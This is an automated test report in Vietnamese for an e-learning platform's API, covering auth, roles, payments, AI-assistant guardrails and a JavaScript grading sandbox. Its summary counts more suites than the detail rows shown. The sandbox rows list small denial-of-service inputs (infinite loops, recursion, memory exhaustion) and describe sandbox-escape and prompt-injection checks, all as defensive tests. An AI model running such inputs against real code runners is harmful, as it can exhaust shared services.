# Bảng test case tự động — 14:58:39 20/11/2026

Jest + Supertest trên DB riêng `<DB_NAME>_test` · 316 test · **316 đạt** · 0 không đạt · 13 bộ test.
Dịch vụ ngoài được giả lập (Gemini SDK, HEAD/DELETE object storage, fetch Judge0, gửi email); sandbox isolated-vm và MySQL chạy thật.

## Tổng hợp theo phân hệ

| Mã | Phân hệ | Số test | Đạt |
|---|---|---|---|
| AI | Trợ lý AI | 39 | 39 |
| APP | Đơn đăng ký giảng viên | 12 | 12 |
| AUTH | Xác thực | 17 | 17 |
| ROLE | Phân quyền | 17 | 17 |
| BUSINESS-FLOWS | business-flows.test.js | 54 | 54 |
| ENROLLMENT | enrollment.test.js | 1 | 1 |
| EXE | Bài tập lập trình & sandbox | 39 | 39 |
| HLS | Video HLS mã hóa AES-128 | 17 | 17 |
| INS | Giảng viên & duyệt khóa học | 39 | 39 |
| MED | Video & tài liệu (object storage) | 28 | 28 |
| QUIZ-DELETE | quiz-delete.test.js | 4 | 4 |
| PAY | Thanh toán & doanh thu giảng viên | 19 | 19 |
| SEC | Bảo mật | 30 | 30 |

## Chi tiết

| Mã TC | Phân hệ | Nhóm | Kịch bản & kết quả mong đợi | Kết quả | Thời gian (ms) |
|---|---|---|---|---|---|
| AI-01 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | stream từng đoạn và trả token đã dùng | ✅ Đạt | 2 |
| AI-02 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | model chính quá tải (503) → tự chuyển model dự phòng | ✅ Đạt | 1 |
| AI-03 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | circuit breaker: model vừa quá tải bị bỏ qua ở request sau (không chờ lại) | ✅ Đạt | 1 |
| AI-04 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | lỗi mạng (fetch failed) → thử model khác | ✅ Đạt | 1 |
| AI-05 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | lỗi giữa chừng khi đã gửi chữ cho người dùng → KHÔNG đổi model (tránh câu trả lời ghép) | ✅ Đạt | 1 |
| AI-06 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | mọi model đều quá tải → OVERLOADED với thông báo thân thiện | ✅ Đạt | 1 |
| AI-07 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | lỗi không thể thử lại (400) → không đổi model | ✅ Đạt | 8 |
| AI-08 | Trợ lý AI | Lớp LLM — chịu lỗi nhà cung cấp | generateJson: JSON hỏng lần đầu → gọi lại; hỏng mãi → BAD_OUTPUT | ✅ Đạt | 3 |
| AI-09 | Trợ lý AI | Prompt trợ lý — grounding & guardrails | catalog chỉ gồm khóa PUBLISHED; prompt có câu từ chối cố định và khóa học viên đã mua | ✅ Đạt | 4 |
| AI-10 | Trợ lý AI | Prompt trợ lý — grounding & guardrails | mô tả khóa học do giảng viên viết không thoát được khỏi <catalog> để chen chỉ thị | ✅ Đạt | 0 |
| AI-11 | Trợ lý AI | Prompt trợ lý — grounding & guardrails | chỉ giữ khóa học có thật — slug AI bịa ra bị loại | ✅ Đạt | 2 |
| AI-12 | Trợ lý AI | POST /api/ai/chat — SSE | khách chưa đăng nhập → 401 | ✅ Đạt | 8 |
| AI-13 | Trợ lý AI | POST /api/ai/chat — SSE | tin nhắn rỗng → 400 | ✅ Đạt | 8 |
| AI-14 | Trợ lý AI | POST /api/ai/chat — SSE | tin nhắn quá 1000 ký tự → 400 | ✅ Đạt | 5 |
| AI-15 | Trợ lý AI | POST /api/ai/chat — SSE | chưa cấu hình API key → 503 | ✅ Đạt | 8 |
| AI-16 | Trợ lý AI | POST /api/ai/chat — SSE | stream meta → delta → done; done chỉ chứa khóa học có thật; lưu cả 2 tin nhắn | ✅ Đạt | 45 |
| AI-17 | Trợ lý AI | POST /api/ai/chat — SSE | hỏi tiếp trong cùng hội thoại → gửi kèm lịch sử cho AI | ✅ Đạt | 20 |
| AI-18 | Trợ lý AI | POST /api/ai/chat — SSE | lịch sử hội thoại: chỉ chủ sở hữu xem / xóa được | ✅ Đạt | 62 |
| AI-19 | Trợ lý AI | POST /api/ai/chat — SSE | AI lỗi → event error với thông báo thân thiện, vẫn kết thúc stream | ✅ Đạt | 21 |
| AI-20 | Trợ lý AI | Trợ lý theo ngữ cảnh bài học, đánh giá câu trả lời, đổi tên hội thoại | chưa ghi danh khóa → 403 khi hỏi kèm lessonId; bài không tồn tại → 403 | ✅ Đạt | 58 |
| AI-21 | Trợ lý AI | Trợ lý theo ngữ cảnh bài học, đánh giá câu trả lời, đổi tên hội thoại | học viên đã ghi danh: prompt có nội dung bài + đề bài tập, KHÔNG có lời giải; hỏi tiếp vẫn giữ ngữ cảnh | ✅ Đạt | 55 |
| AI-22 | Trợ lý AI | Trợ lý theo ngữ cảnh bài học, đánh giá câu trả lời, đổi tên hội thoại | hỏi không kèm lessonId → không có khối bài học | ✅ Đạt | 20 |
| AI-23 | Trợ lý AI | Trợ lý theo ngữ cảnh bài học, đánh giá câu trả lời, đổi tên hội thoại | giảng viên sở hữu khóa hỏi được về bài của mình (xem trước khóa) | ✅ Đạt | 19 |
| AI-24 | Trợ lý AI | Trợ lý theo ngữ cảnh bài học, đánh giá câu trả lời, đổi tên hội thoại | đánh giá câu trả lời: chỉ chủ hội thoại, chỉ tin nhắn của trợ lý, giá trị 1 / -1 / null | ✅ Đạt | 62 |
| AI-25 | Trợ lý AI | Trợ lý theo ngữ cảnh bài học, đánh giá câu trả lời, đổi tên hội thoại | đổi tên hội thoại: chuẩn hóa khoảng trắng, chặn rỗng / quá dài / người khác | ✅ Đạt | 38 |
| AI-26 | Trợ lý AI | POST /api/ai/guest/chat — khách hỏi thử | không cần đăng nhập, không ghi DB; lịch sử gửi kèm được làm sạch; giới hạn lượt theo IP | ✅ Đạt | 17 |
| AI-27 | Trợ lý AI | POST /api/ai/guest/chat — khách hỏi thử | lịch sử dài bị cắt còn tối đa 6 tin và ~4000 ký tự | ✅ Đạt | 1 |
| AI-28 | Trợ lý AI | GET /api/admin/ai-stats — thống kê trợ lý cho admin | chỉ admin xem được; số câu hỏi, đánh giá và câu bị chê đều lấy từ dữ liệu thật | ✅ Đạt | 27 |
| AI-29 | Trợ lý AI | POST /api/instructor/ai/chat — trợ lý giảng viên | chỉ giảng viên dùng được (học viên → 403, khách → 401) | ✅ Đạt | 13 |
| AI-30 | Trợ lý AI | POST /api/instructor/ai/chat — trợ lý giảng viên | prompt chứa khóa của chính giảng viên (kèm lý do bị từ chối), không lộ khóa người khác | ✅ Đạt | 15 |
| AI-31 | Trợ lý AI | POST /api/instructor/ai/chat — trợ lý giảng viên | lịch sử tách riêng: hội thoại giảng viên không hiện / không mở được ở trợ lý học viên và ngược lại | ✅ Đạt | 68 |
| AI-32 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | giảng viên khác → 404; tham số sai → 400 | ✅ Đạt | 16 |
| AI-33 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | loại câu sai luật (một đáp án nhưng 2 đáp án đúng), trả bản nháp — không lưu DB | ✅ Đạt | 11 |
| AI-34 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | AI trả rác liên tục → 502 | ✅ Đạt | 5 |
| AI-35 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | prompt chỉ nhận nội dung bài học dạng text (bỏ thẻ HTML / script) | ✅ Đạt | 0 |
| AI-36 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | xáo trộn đáp án (LLM hay đặt đáp án đúng ở đầu) | ✅ Đạt | 1 |
| AI-37 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | AI soạn nội dung bài học: trả bản nháp Markdown (bỏ khối bọc ngoài), không lưu DB | ✅ Đạt | 7 |
| AI-38 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | AI soạn nội dung: giảng viên khác → 404; độ dài lạ / dàn ý quá dài → 400; AI trả quá ngắn → 502 | ✅ Đạt | 17 |
| AI-39 | Trợ lý AI | AI sinh câu hỏi quiz cho giảng viên | validator giữ đúng số câu yêu cầu | ✅ Đạt | 0 |
| APP-01 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | khách chưa đăng nhập → 401 | ✅ Đạt | 6 |
| APP-02 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | giới thiệu quá ngắn → 400 | ✅ Đạt | 18 |
| APP-03 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | thiếu chuyên môn → 400 | ✅ Đạt | 10 |
| APP-04 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | link không phải http(s) → 400 | ✅ Đạt | 7 |
| APP-05 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | link sai định dạng → 400 | ✅ Đạt | 6 |
| APP-06 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | nộp đơn → PENDING, admin được báo; không nộp được đơn thứ 2 khi đang chờ | ✅ Đạt | 27 |
| APP-07 | Đơn đăng ký giảng viên | Học viên nộp đơn làm giảng viên | giảng viên / admin không nộp đơn → 409 | ✅ Đạt | 11 |
| APP-08 | Đơn đăng ký giảng viên | Admin duyệt đơn | duyệt → role INSTRUCTOR, chép headline/bio sang hồ sơ, người nộp được báo; vào được khu giảng viên | ✅ Đạt | 28 |
| APP-09 | Đơn đăng ký giảng viên | Admin duyệt đơn | refresh token cấp access token mới mang role INSTRUCTOR (không cần đăng nhập lại) | ✅ Đạt | 30 |
| APP-10 | Đơn đăng ký giảng viên | Admin duyệt đơn | từ chối bắt buộc có lý do; người nộp thấy lý do và nộp lại được | ✅ Đạt | 33 |
| APP-11 | Đơn đăng ký giảng viên | Admin duyệt đơn | duyệt 2 lần / duyệt đơn đã từ chối → 409 | ✅ Đạt | 25 |
| APP-12 | Đơn đăng ký giảng viên | Admin duyệt đơn | danh sách + số đơn chờ; chỉ admin | ✅ Đạt | 9 |
| AUTH-01 | Xác thực | GET /health | trả về ok | ✅ Đạt | 3 |
| AUTH-02 | Xác thực | POST /api/auth/register | tạo tài khoản mới với role USER | ✅ Đạt | 226 |
| AUTH-03 | Xác thực | POST /api/auth/register | lưu mật khẩu dạng hash bcrypt, không lưu plaintext | ✅ Đạt | 0 |
| AUTH-04 | Xác thực | POST /api/auth/register | từ chối email đã tồn tại (409) | ✅ Đạt | 7 |
| AUTH-05 | Xác thực | POST /api/auth/register | từ chối khi thiếu thông tin (400) | ✅ Đạt | 8 |
| AUTH-06 | Xác thực | POST /api/auth/login | đăng nhập đúng trả về token và thông tin user | ✅ Đạt | 65 |
| AUTH-07 | Xác thực | POST /api/auth/login | không phân biệt hoa thường của email | ✅ Đạt | 8 |
| AUTH-08 | Xác thực | POST /api/auth/login | sai mật khẩu → 401 | ✅ Đạt | 6 |
| AUTH-09 | Xác thực | POST /api/auth/login | email không tồn tại → 401 với cùng thông báo (không lộ email nào có thật) | ✅ Đạt | 8 |
| AUTH-10 | Xác thực | POST /api/auth/login | tài khoản bị khóa → 403 | ✅ Đạt | 4 |
| AUTH-11 | Xác thực | GET /api/auth/me | có token hợp lệ → trả về user | ✅ Đạt | 6 |
| AUTH-12 | Xác thực | GET /api/auth/me | không có token → 401 | ✅ Đạt | 2 |
| AUTH-13 | Xác thực | GET /api/auth/me | token bị sửa → 401 | ✅ Đạt | 7 |
| AUTH-14 | Xác thực | POST /api/auth/refresh & logout | refresh token hợp lệ → cấp access token mới | ✅ Đạt | 14 |
| AUTH-15 | Xác thực | POST /api/auth/refresh & logout | access token không dùng thay refresh token được (khác secret) | ✅ Đạt | 8 |
| AUTH-16 | Xác thực | POST /api/auth/refresh & logout | sau khi logout, refresh token bị thu hồi | ✅ Đạt | 18 |
| AUTH-17 | Xác thực | POST /api/auth/refresh & logout | user bị khóa sau khi đăng nhập không refresh được | ✅ Đạt | 16 |
| ROLE-01 | Phân quyền | Phân quyền khu vực admin | get /api/admin/dashboard — khách chưa đăng nhập → 401 | ✅ Đạt | 3 |
| ROLE-02 | Phân quyền | Phân quyền khu vực admin | get /api/admin/users — khách chưa đăng nhập → 401 | ✅ Đạt | 2 |
| ROLE-03 | Phân quyền | Phân quyền khu vực admin | get /api/admin/orders — khách chưa đăng nhập → 401 | ✅ Đạt | 1 |
| ROLE-04 | Phân quyền | Phân quyền khu vực admin | get /api/admin/courses — khách chưa đăng nhập → 401 | ✅ Đạt | 2 |
| ROLE-05 | Phân quyền | Phân quyền khu vực admin | post /api/admin/categories — khách chưa đăng nhập → 401 | ✅ Đạt | 1 |
| ROLE-06 | Phân quyền | Phân quyền khu vực admin | post /api/admin/upload/image — khách chưa đăng nhập → 401 | ✅ Đạt | 1 |
| ROLE-07 | Phân quyền | Phân quyền khu vực admin | get /api/admin/dashboard — USER → 403 | ✅ Đạt | 21 |
| ROLE-08 | Phân quyền | Phân quyền khu vực admin | get /api/admin/users — USER → 403 | ✅ Đạt | 6 |
| ROLE-09 | Phân quyền | Phân quyền khu vực admin | get /api/admin/orders — USER → 403 | ✅ Đạt | 7 |
| ROLE-10 | Phân quyền | Phân quyền khu vực admin | get /api/admin/courses — USER → 403 | ✅ Đạt | 7 |
| ROLE-11 | Phân quyền | Phân quyền khu vực admin | post /api/admin/categories — USER → 403 | ✅ Đạt | 5 |
| ROLE-12 | Phân quyền | Phân quyền khu vực admin | post /api/admin/upload/image — USER → 403 | ✅ Đạt | 6 |
| ROLE-13 | Phân quyền | Phân quyền khu vực admin | ADMIN truy cập được dashboard | ✅ Đạt | 15 |
| ROLE-14 | Phân quyền | Route yêu cầu đăng nhập | get /api/orders/me — khách → 401 | ✅ Đạt | 3 |
| ROLE-15 | Phân quyền | Route yêu cầu đăng nhập | get /api/transactions/me — khách → 401 | ✅ Đạt | 2 |
| ROLE-16 | Phân quyền | Route yêu cầu đăng nhập | get /api/wishlists/me — khách → 401 | ✅ Đạt | 1 |
| ROLE-17 | Phân quyền | Route yêu cầu đăng nhập | get /api/notifications — khách → 401 | ✅ Đạt | 3 |
| BUSINESS-FLOWS-01 | business-flows.test.js | Đặt đơn | giảng viên không mua được khóa của chính mình (không tự tạo doanh thu) | ✅ Đạt | 25 |
| BUSINESS-FLOWS-02 | business-flows.test.js | Đặt đơn | đặt lại đúng các khóa đó → dùng lại đơn đang chờ, không sinh đơn trùng | ✅ Đạt | 19 |
| BUSINESS-FLOWS-03 | business-flows.test.js | Đặt đơn | giá đổi sau khi đặt đơn chờ → không trả lại đơn cũ với giá cũ, yêu cầu hủy rồi đặt lại | ✅ Đạt | 17 |
| BUSINESS-FLOWS-04 | business-flows.test.js | Đặt đơn | 2 request đồng thời cho cùng khóa → chỉ có 1 đơn | ✅ Đạt | 18 |
| BUSINESS-FLOWS-05 | business-flows.test.js | Đặt đơn | đơn mới chứa khóa đang nằm trong đơn chờ khác → 409 kèm mã đơn đó | ✅ Đạt | 15 |
| BUSINESS-FLOWS-06 | business-flows.test.js | Đặt đơn | đơn toàn khóa 0đ → hoàn tất ngay, không qua VNPay | ✅ Đạt | 13 |
| BUSINESS-FLOWS-07 | business-flows.test.js | Đặt đơn | thanh toán đơn cũ khi khóa đã ngừng bán → 409 và đơn bị hủy | ✅ Đạt | 10 |
| BUSINESS-FLOWS-08 | business-flows.test.js | Đặt đơn | học viên tự hủy đơn chờ; không hủy được đơn của người khác hoặc đơn đã trả | ✅ Đạt | 22 |
| BUSINESS-FLOWS-09 | business-flows.test.js | Đặt đơn | đăng ký miễn phí đồng thời → 1 enrollment, số học viên tăng đúng 1 | ✅ Đạt | 14 |
| BUSINESS-FLOWS-10 | business-flows.test.js | Job hết hạn đơn | hủy đơn quá hạn, không đụng đơn đã thanh toán | ✅ Đạt | 28 |
| BUSINESS-FLOWS-11 | business-flows.test.js | Admin hủy đơn | hủy đơn đã trả: gỡ enrollment của đơn, trừ học viên đúng 1 lần; hủy lần 2 → 409 | ✅ Đạt | 27 |
| BUSINESS-FLOWS-12 | business-flows.test.js | Admin hủy đơn | hủy đơn đã trả: đánh giá của người mua không còn tính vào điểm khóa học; đánh giá bị ẩn thì giữ | ✅ Đạt | 57 |
| BUSINESS-FLOWS-13 | business-flows.test.js | VNPay IPN (server-to-server) | chữ ký sai → 97, đơn giữ nguyên | ✅ Đạt | 6 |
| BUSINESS-FLOWS-14 | business-flows.test.js | VNPay IPN (server-to-server) | số tiền không khớp → 04 | ✅ Đạt | 6 |
| BUSINESS-FLOWS-15 | business-flows.test.js | VNPay IPN (server-to-server) | không có đơn → 01 | ✅ Đạt | 2 |
| BUSINESS-FLOWS-16 | business-flows.test.js | VNPay IPN (server-to-server) | thành công không cần phiên đăng nhập → PAID + enrollment; VNPay gọi lại → 02 | ✅ Đạt | 14 |
| BUSINESS-FLOWS-17 | business-flows.test.js | VNPay IPN (server-to-server) | giao dịch thất bại → FAILED | ✅ Đạt | 5 |
| BUSINESS-FLOWS-18 | business-flows.test.js | VNPay IPN (server-to-server) | VNPay báo đã thu tiền cho đơn đã hủy → không mở khóa, báo admin đúng 1 lần | ✅ Đạt | 18 |
| BUSINESS-FLOWS-19 | business-flows.test.js | Tiến độ học | bài có quiz chưa đạt → không tự đánh dấu hoàn thành được; đạt quiz thì hoàn thành | ✅ Đạt | 24 |
| BUSINESS-FLOWS-20 | business-flows.test.js | Tiến độ học | thêm bài mới vào khóa đã xong → % giảm, mở lại trạng thái hoàn thành; xóa bài → tính lại | ✅ Đạt | 16 |
| BUSINESS-FLOWS-21 | business-flows.test.js | Nộp quiz | người chưa đăng ký không nộp được (kết quả chứa đáp án đúng) | ✅ Đạt | 6 |
| BUSINESS-FLOWS-22 | business-flows.test.js | Nộp quiz | giảng viên sở hữu được chấm thử nhưng không lưu lượt làm | ✅ Đạt | 4 |
| BUSINESS-FLOWS-23 | business-flows.test.js | Nộp quiz | câu nhiều đáp án: phải chọn đúng và đủ | ✅ Đạt | 25 |
| BUSINESS-FLOWS-24 | business-flows.test.js | Nộp quiz | chưa đạt → chỉ biết điểm, không lộ đúng/sai từng câu; đạt rồi mới xem đáp án | ✅ Đạt | 17 |
| BUSINESS-FLOWS-25 | business-flows.test.js | Nộp quiz | làm sai phải chờ mới được nộp lại; thời gian chờ trả về cho FE; hết chờ thì nộp được | ✅ Đạt | 25 |
| BUSINESS-FLOWS-26 | business-flows.test.js | Nộp quiz | soạn câu hỏi: bắt buộc có đáp án đúng; câu một đáp án chỉ 1 đáp án đúng | ✅ Đạt | 12 |
| BUSINESS-FLOWS-27 | business-flows.test.js | Vòng đời khóa học | đang chờ duyệt: không sửa được nội dung; rút yêu cầu duyệt → về Nháp, sửa được | ✅ Đạt | 22 |
| BUSINESS-FLOWS-28 | business-flows.test.js | Vòng đời khóa học | khóa có học viên: giảng viên không xóa được bài học, vẫn sửa được | ✅ Đạt | 12 |
| BUSINESS-FLOWS-29 | business-flows.test.js | Vòng đời khóa học | bài xem thử của khóa chưa xuất bản không được mở | ✅ Đạt | 12 |
| BUSINESS-FLOWS-30 | business-flows.test.js | Vòng đời khóa học | giá khóa học: từ chối giá âm và giá dưới mức tối thiểu của VNPay, cho phép 0đ | ✅ Đạt | 12 |
| BUSINESS-FLOWS-31 | business-flows.test.js | Vòng đời khóa học | chi tiết khóa học báo isOwner cho giảng viên sở hữu | ✅ Đạt | 12 |
| BUSINESS-FLOWS-32 | business-flows.test.js | Đổi role giảng viên | còn khóa đang bán → 409 | ✅ Đạt | 7 |
| BUSINESS-FLOWS-33 | business-flows.test.js | Đổi role giảng viên | còn doanh thu chưa chi trả → 409 (nếu không số dư sẽ biến mất khỏi trang chi trả) | ✅ Đạt | 17 |
| BUSINESS-FLOWS-34 | business-flows.test.js | Đổi role giảng viên | số dư âm (đơn bị hủy sau khi đã chi trả) → 409, không để mất dấu công nợ | ✅ Đạt | 22 |
| BUSINESS-FLOWS-35 | business-flows.test.js | Đổi role giảng viên | không còn ràng buộc → đổi được; user không tồn tại → 404 | ✅ Đạt | 10 |
| BUSINESS-FLOWS-36 | business-flows.test.js | Độ bền API | query lặp tham số / lồng object không làm sập server | ✅ Đạt | 10 |
| BUSINESS-FLOWS-37 | business-flows.test.js | Độ bền API | page / limit không phải số → dùng mặc định, không lỗi 500 | ✅ Đạt | 4 |
| BUSINESS-FLOWS-38 | business-flows.test.js | Độ bền API | JSON hỏng → 400 dạng JSON; kiểu dữ liệu sai ở đăng nhập → 400 | ✅ Đạt | 17 |
| BUSINESS-FLOWS-39 | business-flows.test.js | Độ bền API | handler async ném lỗi → 500 JSON thay vì sập tiến trình | ✅ Đạt | 9 |
| BUSINESS-FLOWS-40 | business-flows.test.js | Tài khoản bị khóa / đổi quyền | khóa tài khoản thu hồi mọi refresh token: mở khóa lại, phiên cũ không sống lại | ✅ Đạt | 40 |
| BUSINESS-FLOWS-41 | business-flows.test.js | Tài khoản bị khóa / đổi quyền | khóa tài khoản: access token đang còn hạn bị từ chối ngay | ✅ Đạt | 9 |
| BUSINESS-FLOWS-42 | business-flows.test.js | Tài khoản bị khóa / đổi quyền | hạ quyền admin: token cũ mất quyền ngay | ✅ Đạt | 11 |
| BUSINESS-FLOWS-43 | business-flows.test.js | Các ràng buộc khác | upload ảnh: đuôi file theo loại ảnh, không theo tên người dùng gửi | ✅ Đạt | 12 |
| BUSINESS-FLOWS-44 | business-flows.test.js | Các ràng buộc khác | admin lọc khóa học theo danh mục và cấp độ | ✅ Đạt | 13 |
| BUSINESS-FLOWS-45 | business-flows.test.js | Các ràng buộc khác | wishlist không nhận khóa chưa xuất bản | ✅ Đạt | 6 |
| BUSINESS-FLOWS-46 | business-flows.test.js | Các ràng buộc khác | đánh giá bị ẩn không xóa được để đăng lại | ✅ Đạt | 7 |
| BUSINESS-FLOWS-47 | business-flows.test.js | Các ràng buộc khác | xóa danh mục còn khóa lưu trữ → 409, không lỗi 500 | ✅ Đạt | 6 |
| BUSINESS-FLOWS-48 | business-flows.test.js | Các ràng buộc khác | admin không xuất bản được khóa chưa có bài học; trạng thái lạ → 400 | ✅ Đạt | 16 |
| BUSINESS-FLOWS-49 | business-flows.test.js | Các ràng buộc khác | giảng viên sở hữu được gỡ bình luận trong khóa của mình, giảng viên khác thì không | ✅ Đạt | 17 |
| BUSINESS-FLOWS-50 | business-flows.test.js | Tài khoản & đánh giá | đăng ký chuẩn hóa email, đăng nhập được bằng email có khoảng trắng / chữ hoa | ✅ Đạt | 402 |
| BUSINESS-FLOWS-51 | business-flows.test.js | Tài khoản & đánh giá | email sai định dạng → 400 | ✅ Đạt | 2 |
| BUSINESS-FLOWS-52 | business-flows.test.js | Tài khoản & đánh giá | đặt lại mật khẩu xong thì mọi link cũ đều vô hiệu | ✅ Đạt | 205 |
| BUSINESS-FLOWS-53 | business-flows.test.js | Tài khoản & đánh giá | sửa đánh giá đang bị ẩn (đánh giá duy nhất) không lỗi 500, điểm về 0 | ✅ Đạt | 10 |
| BUSINESS-FLOWS-54 | business-flows.test.js | Tài khoản & đánh giá | rating không phải số nguyên 1–5 → 400 | ✅ Đạt | 15 |
| ENROLLMENT-01 | enrollment.test.js | GET /api/enrollments/me — khóa đã lưu trữ | ẩn khóa lưu trữ không còn bài học, vẫn hiện khóa lưu trữ còn nội dung | ✅ Đạt | 31 |
| EXE-01 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | code đúng → function sum(a, b) { return a + b } | ✅ Đạt | 6 |
| EXE-02 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | arrow function → const sum = (a, b) => a + b | ✅ Đạt | 3 |
| EXE-03 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | async function → async function sum(a, b) { return a + b } | ✅ Đạt | 3 |
| EXE-04 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | kết quả sai → function sum(a, b) { return a - b } | ✅ Đạt | 3 |
| EXE-05 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | throw lỗi → function sum() { throw new Error("boom") } | ✅ Đạt | 4 |
| EXE-06 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | sai tên hàm → function add(a, b) { return a + b } | ✅ Đạt | 3 |
| EXE-07 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | lỗi cú pháp → function sum(a, b { return a + b } | ✅ Đạt | 2 |
| EXE-08 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | vòng lặp vô hạn → function sum() { while (true) {} } | ✅ Đạt | 315 |
| EXE-09 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | vòng lặp ở top-level → while (true) {} | ✅ Đạt | 309 |
| EXE-10 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | Promise không resolve → function sum() { return new Promise(() => {}) } | ✅ Đạt | 357 |
| EXE-11 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | tràn bộ nhớ → function sum() { const a = []; while (true) a.push(new Array(1e6).fill(1)) } | ✅ Đạt | 47 |
| EXE-12 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | đệ quy vô hạn → function sum(a) { return sum(a) } | ✅ Đạt | 8 |
| EXE-13 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | không có require / process / fetch / setTimeout, không thoát được qua constructor | ✅ Đạt | 2 |
| EXE-14 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | mỗi test chạy trong context mới — biến toàn cục không rò giữa các test | ✅ Đạt | 3 |
| EXE-15 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | so sánh object không phụ thuộc thứ tự key; mảng phải đúng thứ tự | ✅ Đạt | 4 |
| EXE-16 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | ghi lại console.log để hiển thị cho học viên | ✅ Đạt | 3 |
| EXE-17 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | quá thời gian ở test đầu → bỏ qua các test sau | ✅ Đạt | 309 |
| EXE-18 | Bài tập lập trình & sandbox | Sandbox isolated-vm — chấm đúng & an toàn | server vẫn phục vụ request khác trong lúc đang chấm bài có vòng lặp vô hạn | ✅ Đạt | 1528 |
| EXE-19 | Bài tập lập trình & sandbox | Sandbox — không để một bài nộp chiếm máy chấm | vượt tổng thời gian của cả bài → dừng chấm, TIME_LIMIT (không được ACCEPTED) | ✅ Đạt | 487 |
| EXE-20 | Bài tập lập trình & sandbox | Sandbox — không để một bài nộp chiếm máy chấm | hàng chờ đầy → từ chối ngay (RUNNER_BUSY) thay vì treo request | ✅ Đạt | 488 |
| EXE-21 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | tên hàm không hợp lệ → 400 | ✅ Đạt | 16 |
| EXE-22 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | input không phải mảng → 400 | ✅ Đạt | 5 |
| EXE-23 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | JSON sai → 400 | ✅ Đạt | 4 |
| EXE-24 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | toàn test ẩn → 400 | ✅ Đạt | 4 |
| EXE-25 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | không có test → 400 | ✅ Đạt | 4 |
| EXE-26 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | giới hạn thời gian lạ → 400 | ✅ Đạt | 4 |
| EXE-27 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | giảng viên khác không soạn / xem được → 404 | ✅ Đạt | 9 |
| EXE-28 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | lưu bài tập; lưu lại thì thay toàn bộ test case | ✅ Đạt | 22 |
| EXE-29 | Bài tập lập trình & sandbox | API bài tập › Soạn bài (giảng viên) | kiểm tra đề: lời giải đúng → ACCEPTED; đề sai expected → báo test sai | ✅ Đạt | 17 |
| EXE-30 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | đề bài không chứa lời giải và test ẩn | ✅ Đạt | 7 |
| EXE-31 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | chưa mua → 403 | ✅ Đạt | 7 |
| EXE-32 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | chạy thử: chỉ chạy test công khai, không lưu | ✅ Đạt | 8 |
| EXE-33 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | nộp sai test ẩn: test ẩn chỉ báo đạt/không, không lộ input/expected | ✅ Đạt | 9 |
| EXE-34 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | nộp đúng → ACCEPTED, lưu bài nộp, hoàn thành bài học và cập nhật % tiến độ | ✅ Đạt | 24 |
| EXE-35 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | code rỗng hoặc quá 20.000 ký tự → 400 | ✅ Đạt | 19 |
| EXE-36 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | giảng viên sở hữu nộp thử được nhưng không tính tiến độ | ✅ Đạt | 10 |
| EXE-37 | Bài tập lập trình & sandbox | API bài tập › Làm bài (học viên) | xóa bài tập → học viên thấy exercise = null | ✅ Đạt | 9 |
| EXE-38 | Bài tập lập trình & sandbox | Giới hạn tần suất chạy code | vượt giới hạn → 429 | ✅ Đạt | 9 |
| EXE-39 | Bài tập lập trình & sandbox | Judge0 runner (fetch giả lập) | gửi theo lô, đọc kết quả sau marker, phân loại trạng thái | ✅ Đạt | 5 |
